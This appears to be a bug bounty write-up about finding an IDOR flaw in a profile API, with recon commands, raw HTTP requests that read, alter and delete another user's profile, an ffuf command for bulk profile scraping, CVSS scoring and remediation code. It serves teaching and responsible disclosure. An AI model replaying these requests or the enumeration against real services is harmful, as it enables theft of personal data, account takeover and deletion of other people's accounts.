# 🐛💰🔓🎯 Finding an IDOR in User Profile API: A $15,000 Journey to Critical

**Published:** 2026-03-28


_How I discovered a critical Insecure Direct Object Reference vulnerability that allowed unauthorized access to any user profile — and how you can find similar bugs._

> TL;DR: I found a critical IDOR vulnerability in a user profile API endpoint that allowed any authenticated user to view, modify, or delete any other user’s private profile data by simply changing the user ID parameter. The bug earned me a $15,000 payout after a smooth 12-day disclosure process with the vendor.

![Image](https://miro.medium.com/v2/resize:fit:700/1*oWBwO1xnUIeJ67Am2u3RSw.png)

## 🎯 Target & Scope

The program I was hunting on had a solid scope that included their main web application and all associated API endpoints. They specifically called out “_.targetapp.com” and “_.targetapp.io” as in-scope, along with their mobile API which was accessible via “api.targetapp.io”.

I always start by reading the scope three times. Sounds excessive, but I’ve missed easy wins by skimming.

The scope document mentioned they had recently launched a new profile management system as part of their platform redesign. That’s always a red flag — new code means potential security gaps.

The bounty program offered rewards from $500 (low) to $25,000 (critical), with clear severity ratings based on CVSS 3.1 scoring. They were particularly interested in authentication bypasses, data exposure, and privilege escalation vulnerabilities. IDOR findings were explicitly listed as high-value targets.

If you’re new to bug bounty hunting, here’s what I want you to understand: always focus your efforts on areas the program explicitly values. A reflected XSS in an out-of-scope subdomain might be fun to find, but it won’t pay. Prioritize strategically.

## 🔍 Reconnaissance: Building the Attack Surface

I kicked off my recon phase with subdomain enumeration. This is where most hunters either rush or give up, but I treat this step like building a house foundation — sloppy work here costs you later.

First, I ran subfinder to gather subdomains:

subfinder -d targetapp.io -all -o subdomains.txt

This gave me around 150 unique subdomains. I piped these through httpx to check for live hosts and identify technologies:

cat subdomains.txt | httpx -title -web-server -tech-detect -o live\_hosts.txt

That’s when I spotted something interesting. api.targetapp.io was running on what appeared to be a Node.js backend with Express framework. The tech stack section showed “Express” and “Node.js” headers, plus a X-Powered-By header that revealed the version.

![Image](https://miro.medium.com/v2/resize:fit:700/1*51ZQVc2gfQmAuo6jOqJr9Q.png)

I ran a quick Nuclei scan against the API subdomain to catch any low-hanging fruit:

nuclei -u https://api.targetapp.io -t /usr/share/nuclei-templates/ -o nuclei\_results.txt

The scan came back clean — no obvious vulnerabilities. But Nuclei only catches known patterns. The real gems often hide in custom application logic.

At this point, I switched to manual exploration. I created two test accounts and began poking around the application.

I noticed they had an API documentation page at “api.targetapp.io/docs” — jackpot! API documentation is gold for hunters because it reveals the exact endpoints and parameter names.

The documentation showed endpoints for user management including:

*   GET /api/v2/users/{userId}/profile
*   PUT /api/v2/users/{userId}/profile
*   DELETE /api/v2/users/{userId}/profile
*   GET /api/v2/users/{userId}/settings

The {userId} parameter immediately caught my attention. When I see an endpoint that takes an ID and returns data, my IDOR senses start tingling.

## 💡 Discovery: The Moment Everything Clicked

Here’s where the hunter’s instinct kicks in. I was logged in as User A, viewing my own profile at:

GET /api/v2/users/1001/profile  
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

The response came back with my profile data — name, email, phone number, billing address, everything. Now, here’s what I did next that many beginners overlook: I tried accessing another user’s profile.

I created a second account (User B) and noted their user ID was 1002. Then I sent this request while logged in as User A:

GET /api/v2/users/1002/profile  
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

My heart actually skipped when I saw the response come back with User B’s complete profile data. No authorization error.

No access denied message. Just User B’s private information served up on a silver platter.

![Image](https://miro.medium.com/v2/resize:fit:700/1*s05T4xpR0dm6dBHcsUpEQA.jpeg)

But I didn’t celebrate yet. I’ve been burned before by misinterpreting what I saw. Let me verify this is truly an IDOR and not just expected behavior for public profiles.

I checked User B’s privacy settings — their profile was set to “private”. Their email, phone, and billing address were marked as “visible only to me” in their account settings.

Yet I was able to retrieve all of it. This confirmed I had found something real.

## 💣 Exploitation: Building a Complete Attack Chain

Now I needed to fully understand the scope of this vulnerability. I systematically tested each endpoint to see what actions I could perform on other users’ profiles.

## Test 1: Profile Viewing (Confirmed)

As User A (ID: 1001), I accessed User B’s profile (ID: 1002):

GET /api/v2/users/1002/profile HTTP/1.1  
Host: api.targetapp.io  
Authorization: Bearer \[User\_A\_TOKEN\]  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)  
  
HTTP/1.1 200 OK  
Content-Type: application/json  
  
{  
  "id": 1002,  
  "username": "victim\_user",  
  "email": "victim@example.com",  
  "phone": "+1-555-0123",  
  "billing\_address": {  
    "street": "123 Victim Street",  
    "city": "Springfield",  
    "zip": "12345"  
  },  
  "profile\_visibility": "private",  
  "two\_factor\_enabled": true  
}

Full profile data returned without any authorization check. This included sensitive fields marked private by the user.

## Test 2: Profile Modification

I attempted to modify User B’s profile while authenticated as User A:

PUT /api/v2/users/1002/profile HTTP/1.1  
Host: api.targetapp.io  
Authorization: Bearer \[User\_A\_TOKEN\]  
Content-Type: application/json  
  
{  
  "email": "hacker@evil.com",  
  "phone": "+1-555-9999",  
  "bio": "I WAS HACKED"  
}  
  
HTTP/1.1 200 OK  
Content-Type: application/json  
  
{  
  "success": true,  
  "message": "Profile updated successfully"  
}

Not only could I view their data — I could modify it. The bio field was changed to “I WAS HACKED” in User B’s profile. Any user could overwrite another user’s profile information.

## Test 3: Profile Deletion

This is when the impact really hit me. I tested account deletion:

DELETE /api/v2/users/1002/profile HTTP/1.1  
Host: api.targetapp.io  
Authorization: Bearer \[User\_A\_TOKEN\]  
  
HTTP/1.1 200 OK  
Content-Type: application/json  
{  
  "success": true,  
  "message": "Profile deleted successfully"  
}

Any authenticated user could permanently delete any other user’s account. No confirmation email.

No secondary authentication. Just a single API call and that account was gone.

## Test 4: Settings Enumeration

I also tested the settings endpoint:

GET /api/v2/users/1002/settings HTTP/1.1  
Host: api.targetapp.io  
Authorization: Bearer \[User\_A\_TOKEN\]  
  
HTTP/1.1 200 OK  
{  
  "user\_id": 1002,  
  "email\_notifications": true,  
  "sms\_notifications": false,  
  "two\_factor\_method": "authenticator",  
  "password\_last\_changed": "2024-01-15T10:30:00Z",  
  "recovery\_email": "backup@example.com",  
  "api\_keys": \["sk\_live\_abc123...", "sk\_live\_def456..."\]  
}

The settings endpoint exposed even more sensitive data, including API keys that could potentially be used to access the user’s account through other integrated services.

![Image](https://miro.medium.com/v2/resize:fit:700/1*b9vzVnV8wv8xUDpVV69e1A.jpeg)

## Test 5: Automated Enumeration

To prove scalability, I wrote a quick ffuf command to enumerate user IDs and extract profiles in bulk:

ffuf -w /usr/share/wordlists/user\_ids.txt:FUZZ \\  
  -u https://api.targetapp.io/api/v2/users/FUZZ/profile \\  
  -H "Authorization: Bearer \[User\_A\_TOKEN\]" \\  
  -fr "User does not exist" \\  
  -o idor\_results.json

The wordlist contained sequential IDs from 1000 to 2000. Within seconds, I had extracted 47 valid user profiles. In a real attack, someone could scrape the entire user database.

## 💥 Impact Assessment: Understanding the True Severity

This wasn’t just a simple information disclosure. Let me break down the real-world impact of this vulnerability.

## Confidentiality Impact: Critical

An attacker could access any user’s private profile data including email addresses, phone numbers, billing addresses, and two-factor authentication settings. For a business application, this is a massive data breach waiting to happen.

## Integrity Impact: Critical

Attackers could modify user profiles, delete accounts permanently, and change security settings. This enables account takeover scenarios and could lead to users being locked out of their own accounts.

## Availability Impact: High

Account deletion means legitimate users lose access to paid services, purchased content, and account history. This represents a denial-of-service vector.

## CVSS 3.1 Vector Calculation

I calculated the CVSS vector based on my findings:

*   Attack Vector: Network (AV:N)
*   Attack Complexity: Low (AC:L)
*   Privileges Required: Low (PR:L) — any authenticated user
*   User Interaction: None (UI:N)
*   Scope: Changed (S:C) — affects other users
*   Confidentiality: High (C:H)
*   Integrity: High (I:H)
*   Availability: High (A:H)

CVSS 3.1 Score: 9.3 (Critical)

The vector string: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

To put this in perspective, this score puts the vulnerability in the same severity league as critical RCE vulnerabilities. The “Scope Changed” component is particularly important here — we’re not just affecting the attacker’s own account, we’re impacting other users’ data and functionality.

## Real-World Attack Scenarios

Here’s what a malicious actor could do with this vulnerability:

*   Bulk scrape all user data for resale on dark web markets
*   Delete competitor accounts during a business-critical period
*   Modify billing addresses to redirect orders
*   Change two-factor settings to facilitate account takeover
*   Exfiltrate API keys for secondary attacks against integrated services

The list goes on. This is exactly the kind of vulnerability that leads to news headlines about data breaches.

## 🛡️ Remediation: How the Development Team Fixed It

I included detailed remediation steps in my report because programs appreciate hunters who think like developers. Here’s what I recommended and what they implemented:

## 1\. Implement Proper Authorization Checks

The root cause was missing server-side authorization. Every API endpoint that accesses user data must verify that the requesting user has permission to access that specific resource. This should happen at the beginning of every handler function:

// BAD (what they had)  
app.get('/api/v2/users/:userId/profile', (req, res) => {  
  const profile = getProfile(req.params.userId);  
  res.json(profile);  
});  
  
// GOOD (what they implemented)  
app.get('/api/v2/users/:userId/profile', authenticateToken, (req, res) => {  
  // Verify the authenticated user can access this profile  
  if (req.user.userId !== req.params.userId && !req.user.isAdmin) {  
    return res.status(403).json({ error: 'Access denied' });  
  }  
  const profile = getProfile(req.params.userId);  
  res.json(profile);  
});

## 2\. Use Indirect Object References

Instead of exposing internal database IDs, use opaque tokens or session-based context. The endpoint should reference the current user’s data through the authenticated session, not through a client-supplied ID.

## 3\. Apply the Principle of Least Privilege

Users should only be able to access their own data by default. Admin functions requiring cross-user access should require separate, explicitly granted permissions.

## 4\. Implement Rate Limiting and Monitoring

Even with proper authorization, rate limiting prevents enumeration attacks. They implemented aggressive rate limiting on profile endpoints and added anomaly detection for bulk access patterns.

## 5\. Security Code Review Process

I recommended they add IDOR-specific checks to their code review checklist. Every endpoint accepting user-controlled object references should be flagged for authorization review.

## 💰 Bounty & Timeline

Here’s the complete disclosure timeline:

*   **Day 1 (0:00):** Submitted initial report with full PoC, CVSS calculation, and remediation steps.
*   **Day 1 (4:30):** Triager confirmed receipt and escalated to engineering team.
*   **Day 3:** Vendor reproduced the issue and confirmed severity as Critical.
*   **Day 5:** Engineering deployed a hotfix to production.
*   **Day 7:** Received confirmation of full remediation with detailed change logs.
*   **Day 12:** Bounty awarded: $15,000 (Critical tier)
*   **Day 14:** Report marked as resolved, public disclosure permitted.

The $15,000 payout was at the higher end of their Critical range, which I attribute to the comprehensive report structure, clear reproduction steps, and actionable remediation guidance.

## 🎯 Key Takeaways for Bug Bounty Hunters

Here’s what I want you to take away from this writeup:

## 1\. Always Test Access Control on User-Specific Endpoints

Any endpoint that takes an object ID (user ID, document ID, order ID, etc.) and returns data is a potential IDOR target. The pattern is predictable and easy to test. Create two accounts and try accessing User B’s data while logged in as User A.

## 2\. Don’t Just Look — Also Try to Modify

Most hunters test for read access but forget to test write access. I consistently try GET, PUT, POST, and DELETE on every user-specific endpoint. Write access often earns higher bounties.

## 3\. Report Quality Matters

My $15,000 payout wasn’t just about the bug severity. The quality of my report — including CVSS calculation, clear PoC steps, and remediation guidance — made it easy for the vendor to validate and prioritize the fix. Treat your report as a product you’re delivering.

## 4\. Understand Business Impact

Frame your findings in terms of real business risk. Instead of just saying “IDOR allows viewing other users’ profiles,” explain what an attacker could do: mass data exfiltration, account deletion affecting paid users, potential GDPR violations leading to regulatory fines.

## 5\. Automate the Boring Parts

I used ffuf for enumeration and Nuclei for scanning. These tools let me scale my testing and find edge cases I might miss manually. Invest time in learning automation — it pays dividends.

## 6\. Read API Documentation

That /docs endpoint on the API subdomain was my starting point. Documentation reveals the exact endpoints, parameters, and expected behaviors. Never skip API documentation during recon.

## 7\. Think Like an Attacker

When testing, don’t just verify the vulnerability exists. Ask yourself: “What would a malicious actor actually do with this?” Then demonstrate that attack chain in your PoC. The more complete your attack scenario, the higher your severity rating and payout.

If you’re just starting in bug bounty hunting, don’t be intimidated. I found this vulnerability using techniques anyone can learn. Start with IDOR testing — it’s one of the most accessible vulnerability classes and appears in almost every application.

Keep hunting, keep learning, and happy hacking! 🔍

If you found this writeup helpful, follow me for more in-depth security research and bug bounty content. Feel free to reach out with questions about the techniques covered here.